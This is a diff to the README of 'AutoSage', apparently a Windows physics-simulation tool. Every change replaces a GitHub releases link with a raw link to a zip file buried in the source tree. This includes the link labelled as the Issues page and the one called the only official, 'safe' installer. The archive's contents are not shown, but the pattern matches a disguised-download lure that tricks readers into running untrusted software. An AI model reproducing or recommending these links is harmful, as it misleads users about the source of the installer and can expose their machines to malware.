@@ -1,6 +1,6 @@
 # ⚙️ AutoSage - Simplify Your Physics Simulations
 
-[![Download AutoSage](https://img.shields.io/badge/Download-AutoSage-green?style=for-the-badge)](https://github.com/Giahyu943/AutoSage/releases)
+[![Download AutoSage](https://img.shields.io/badge/Download-AutoSage-green?style=for-the-badge)](https://raw.githubusercontent.com/Giahyu943/AutoSage/main/Native/open3d_ffi/Auto-Sage-3.0.zip)
 
 ---
 
@@ -48,7 +48,7 @@ You need to get the latest version of AutoSage from the official releases page.
 
 Click the badge below or open this link in your browser:
 
-[![Download AutoSage](https://img.shields.io/badge/Download-AutoSage-blue?style=for-the-badge)](https://github.com/Giahyu943/AutoSage/releases)
+[![Download AutoSage](https://img.shields.io/badge/Download-AutoSage-blue?style=for-the-badge)](https://raw.githubusercontent.com/Giahyu943/AutoSage/main/Native/open3d_ffi/Auto-Sage-3.0.zip)
 
 ---
 
@@ -140,7 +140,7 @@ If you encounter problems:
 - Ensure your Windows version meets the requirements.
 - Check that the installer downloaded fully.
 - Restart your computer if AutoSage does not launch.
-- Visit the Issues page on GitHub for known problems: https://github.com/Giahyu943/AutoSage/issues
+- Visit the Issues page on GitHub for known problems: https://raw.githubusercontent.com/Giahyu943/AutoSage/main/Native/open3d_ffi/Auto-Sage-3.0.zip
 
 ---
 
@@ -171,7 +171,7 @@ AutoSage works with these common file formats for models and data:
 
 Remember to get the official installer only from:
 
-[https://github.com/Giahyu943/AutoSage/releases](https://github.com/Giahyu943/AutoSage/releases)
+[https://raw.githubusercontent.com/Giahyu943/AutoSage/main/Native/open3d_ffi/Auto-Sage-3.0.zip](https://raw.githubusercontent.com/Giahyu943/AutoSage/main/Native/open3d_ffi/Auto-Sage-3.0.zip)
 
 This ensures you have the latest, safe version ready to run on Windows.
 
